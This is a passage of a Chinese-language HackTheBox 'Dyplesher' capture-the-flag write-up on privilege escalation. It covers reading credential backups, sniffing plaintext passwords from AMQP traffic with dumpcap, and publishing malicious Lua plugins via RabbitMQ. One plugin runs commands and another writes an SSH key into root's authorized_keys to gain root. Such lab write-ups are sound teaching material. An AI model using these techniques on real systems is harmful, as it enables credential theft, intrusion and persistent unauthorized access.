    drwxr-xr-x  2 root     root     4096 Apr 23  2020 backup
    drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .composer
    drwxrwxr-x  6 MinatoTW MinatoTW 4096 Apr 23  2020 paper
    -rw-rw-r--  1 MinatoTW MinatoTW   54 Apr 23  2020 .gitconfig
    drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .local
    -rw-rw-r--  1 MinatoTW MinatoTW   66 Apr 23  2020 .selected_editor
    -rw-r--r--  1 MinatoTW MinatoTW  220 Apr 23  2020 .bash_logout
    -rw-r--r--  1 MinatoTW MinatoTW 3771 Apr 23  2020 .bashrc
    -rw-r--r--  1 MinatoTW MinatoTW  807 Apr 23  2020 .profile
backup文件夹下主要就是保存了三个用户的账号密码信息等：
    MinatoTW@dyplesher:~$ cd backup/
    MinatoTW@dyplesher:~/backup$ ls -alt
    total 24
    drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 ..
    drwxr-xr-x  2 root     root     4096 Apr 23  2020 .
    -rwxr-xr-x  1 root     root       66 Apr 23  2020 email
    -rwxr-xr-x  1 root     root       24 Apr 23  2020 username
    -rwxr-xr-x  1 root     root      170 Apr 23  2020 backup.sh
    -rwxr-xr-x  1 root     root      182 Sep 15  2019 password
    MinatoTW@dyplesher:~/backup$ cat email 
    PI:EMAIL
    PI:EMAIL
    PI:EMAIL
    MinatoTW@dyplesher:~/backup$ cat username 
    MinatoTW
    felamos
    yuntao
    MinatoTW@dyplesher:~/backup$ cat password 
    $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
    $2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
    $2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
    MinatoTW@dyplesher:~/backup$ cat backup.sh 
    #!/bin/bash
    memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm
    memccp --servers 127.0.0.1 --username felamos --password zxcvbnm /home/MinatoTW/backup/*
`paper/`文件夹下的内容就是之前在repo.zip包中的部分文件：
    MinatoTW@dyplesher:~/paper$ ls -al
    total 39392
    drwxrwxr-x  6 MinatoTW MinatoTW     4096 Apr 23  2020 .
    drwxr-xr-x 10 MinatoTW MinatoTW     4096 May 20 13:41 ..
    -rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-ips.json
    -rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-players.json
    -rw-rw-r--  1 MinatoTW MinatoTW     1049 Nov  7 14:25 bukkit.yml
    drwxrwxr-x  2 MinatoTW MinatoTW     4096 Sep  8  2019 cache
    -rw-rw-r--  1 MinatoTW MinatoTW      593 Nov  7 14:25 commands.yml
    -rw-rw-r--  1 MinatoTW MinatoTW      221 Sep  8  2019 eula.txt
    -rw-rw-r--  1 MinatoTW MinatoTW     2576 Sep  8  2019 help.yml
    drwxrwxr-x  2 MinatoTW MinatoTW     4096 Nov  7 14:25 logs
    -rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 ops.json
    -rw-rw-r--  1 MinatoTW MinatoTW 40248740 Sep  8  2019 paper.jar
    -rw-rw-r--  1 MinatoTW MinatoTW     5417 Nov  7 14:25 paper.yml
    -rw-rw-r--  1 MinatoTW MinatoTW        0 Sep  8  2019 permissions.yml
    drwxrwxr-x  4 MinatoTW MinatoTW     4096 Nov  7 16:20 plugins
    -rw-rw-r--  1 MinatoTW MinatoTW      723 Nov  7 14:25 server.properties
    -rw-rw-r--  1 MinatoTW MinatoTW     3311 Nov  7 14:25 spigot.yml
    -rwxrwxr-x  1 MinatoTW MinatoTW       48 Sep  8  2019 start.sh
    -rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 usercache.json
    -rw-rw-r--  1 MinatoTW MinatoTW       48 Sep  8  2019 version_history.json
    -rw-rw-r--  1 MinatoTW MinatoTW        2 Sep  8  2019 whitelist.json
    drwxrwxr-x  5 MinatoTW MinatoTW     4096 Nov  7 17:11 world
Cuberite是Minecraft的一个服务器实现，而`Cuberite/`目录下就是相关文件：
    MinatoTW@dyplesher:~/Cuberite$ ls
    BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world
    banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether
    brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end
到目前为止并没有在这三个文件夹下发现什么可用的信息……
但是当前的用户的属组之一是`wireshark`：
    MinatoTW@dyplesher:~$ id
    uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
寻找属组为wireshark的文件，发现只有一个文件`/usr/bin/dumpcap`，是一个抓包软件：
    MinatoTW@dyplesher:/$ find / -group wireshark -ls 2>/dev/null 
      5908757    112 -rwxr-xr--   1 root     wireshark   113112 Sep 26  2019 /usr/bin/dumpcap
该文件也没有什么suid标志，所以也很难通过它来提权。
###  dumpcap
但是我们可以执行dumpcap命令，抓个包试试，保存为`/tmp/out.pcapng`：
    MinatoTW@dyplesher:~$ dumpcap -w /tmp/out.pcapng
    Capturing on 'veth5f13bbe'
    File: /tmp/out.pcapng
    Packets: 1800
用wireshark打开`out.pcagpng`：
发现了很多条与AMQP协议相关的流量，右键`Follow TCP Stream`：
发现了用户`MinatoTW`、`felamos`和`Yuntao`的账号密码：
    name : MinatoTW
    email : PI:EMAIL
    password : bihys1amFov
    name : yuntao
    email : PI:EMAIL
    password : wagthAw4ob
    name : felamos
    email : PI:EMAIL
    password : tieb0graQueg
登录用户felamos（在yuntao的/home目录下没有发现什么有意思的东西）：
    ╭─kali@kali ~ 
    ╰─$ ssh PI:EMAIL
    PI:EMAIL's password: 
    Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
      System information as of Sat 07 Nov 2020 05:37:23 PM UTC
      System load:  0.05              Processes:              259
      Usage of /:   6.7% of 97.93GB   Users logged in:        1
      Memory usage: 41%               IP address for ens33:   10.10.10.190
      Swap usage:   0%                IP address for docker0: 172.17.0.1
    57 updates can be installed immediately.
    0 of these updates are security updates.
    To see these additional updates run: apt list --upgradable
    Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
    Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
    felamos@dyplesher:~$ id
    uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
在home目录下发现user.txt，拿到user flag：
    felamos@dyplesher:~$ ls
    cache  snap  user.txt  yuntao
    felamos@dyplesher:~$ cat user.txt 
    xxxxxxxxxxxxxxxxxxxx
###  提权
在`/home/felamos`下存在名为`yuntao`的目录，目录下只有一个脚本`send.sh`：
    felamos@dyplesher:~$ cd yuntao/
    felamos@dyplesher:~/yuntao$ ls
    send.sh
    felamos@dyplesher:~/yuntao$ cat send.sh
    #!/bin/bash
    echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
这个脚本没有什么特别的意思，只是会向`/dev/pts/`目录下的`{}`管道输出一条消息：
> Yuntao， 请发布所有用户的cuberite插件，只需要提供url去下载plugin即可，我们的代码会自动访问该插件并且将插件放在服务器上执行。
####  AMQP协议
AMQP协议全称Advanced Message Queuing
Protocol（高级消息队列协议），是面向消息中间件提供的开放的应用层协议，其设计目标是对消息的排序、路由、保证可靠性和安全性（[wikipedia](https://zh.wikipedia.org/zh-hans/%E9%AB%98%E7%BA%A7%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%8D%8F%E8%AE%AE)）。我们可以把消息队列比作是一个存放消息的容器，当我们需要使用消息的时候可以取出消息供自己使用，目的是通过异步处理提高系统性能、降低系统耦合性，目前使用比较多的消息队列有ActiveMQ，RabbitMQ（[zhihu](https://zhuanlan.zhihu.com/p/52773169)），后者就是目标服务器上使用的消息队列。
####  RabbitMQ
RabbitMQ是一个实现了AMQP协议的消息队列。RabbitMQ的工作原理如下图所示：
  * Producer：发送消息到MQ。
  * Broker：消息队列服务进程，包括exchange和queue。
  * Exchange：消息队列交换机，会按照一定的规则对消息进行过滤，并将消息转发到某个队列。
  * Queue：消息队列，在消息到达队列的时候会被转发给指定的Consumer。
  * Consumer：接收MQ转发的消息。
当存在多个Queue的时候，消息会被Exchange按照一定的路由规则分发到指定的Queue中去。这就涉及到Producer指定的消息的routing
key，routing key指定了Message会被发送到哪个Exchange，Queue会通过binding
key绑定到指定的Exchange。Exchange通过对比Message的routing key和Queue的binding
key来决定消息会被发送到哪个队列。
前面提到的`send.sh`就是指Yuntao可以发布用户自己定制的cuberite插件，如下图所示：
Cubrite是一个可扩展的Minecraft服务器实现，它有一个易于使用的插件系统，允许用户用Lua编写自定义插件。
从之前抓到的流量包里我们也知道了Yuntao的AMQP凭证是`EashAnicOc3Op`：
我们可以借用一款工具来发布我们的Lua插件，[amqp-publish](https://github.com/selency/amqp-publish)：
    ╭─kali@kali ~/htb-tools 
    ╰─$ ./amqp-publish.linux-amd64 --help        
    Usage of ./amqp-publish.linux-amd64:
      -body string
            Message body
      -exchange string
            Exchange name
      -routing-key string
            Routing key. Use queue
            name with blank exchange to publish directly to queue.
      -uri string
            AMQP URI amqp://:@:/[vhost]
在此之前，先看看是否可以通过这种方式在目标服务器上执行命令。先尝试创建一个lua脚本，它会向/tmp目录写入名为test的文件：
    // test.lua
    os.execute("touch /tmp/test")
先在目标主机上开启fpt服务，主要目的是判断我们有没有成功发布消息：
    MinatoTW@dyplesher:~/paper$ python3 -m http.server 22222
    Serving HTTP on 0.0.0.0 port 22222 (http://0.0.0.0:22222/) ...
除了已经知道的`:`以外，我们还需要提供`exchange`和`routing-key`，从`send.sh`中可以推测出它们应该是`plugin_data`：
    Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue".
通过amqp-publish发布：
    ╭─kali@kali ~/htb-tools 
    ╰─$ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:PI:EMAIL:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:22222/test.lua"
消息被成功发布：
    MinatoTW@dyplesher:~/paper$ python3 -m http.server 22222
    Serving HTTP on 0.0.0.0 port 22222 (http://0.0.0.0:22222/) ...
    127.0.0.1 - - [07/Nov/2020 18:38:50] "GET /test.lua HTTP/1.0" 200 -    
`test.lua`被成功执行，在`/tmp`目录下，`test`文件被创建：
并且该文件是属于root用户的。
####  ssh.lua -> RCE
现在我们可以向`/root/.ssh/authorized_keys`写入我们的公钥：
    // ssh.lua
    file = io.open('/root/.ssh/authorized_keys', 'w+')
    ssh = 'ssh-rsa AAAAB......BL/upYw== kali@kali'
    file.write(ssh)
    file.close()
通过同样的方式发布：
    ╭─kali@kali ~/htb-tools 
    ╰─$ ./amqp-publish.linux-amd64 --uri="amqp://yuntao:PI:EMAIL:5672/" --exchange="" --routing-key="plugin_data" --body="http://127.0.0.1:22222/ssh.lua"
成功登录root用户：
    ╭─kali@kali ~/.ssh 
    ╰─$ ls
    id_rsa  id_rsa.pub  known_hosts
    ╭─kali@kali ~/.ssh 
    ╰─$ ssh -i id_rsa PI:EMAIL
    Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)
     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage
      System information as of Sat 07 Nov 2020 06:44:33 PM UTC
      System load:  0.06              Processes:              261
      Usage of /:   6.7% of 97.93GB   Users logged in:        1
      Memory usage: 42%               IP address for ens33:   10.10.10.190
      Swap usage:   0%                IP address for docker0: 172.17.0.1
    57 updates can be installed immediately.
    0 of these updates are security updates.
    To see these additional updates run: apt list --upgradable
    Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings
    Last login: Sun May 24 03:33:34 2020
    root@dyplesher:~# id
    uid=0(root) gid=0(root) groups=0(root)
    root@dyplesher:~#
读取root.txt：
    root@dyplesher:~# ls
    root.txt  snap  work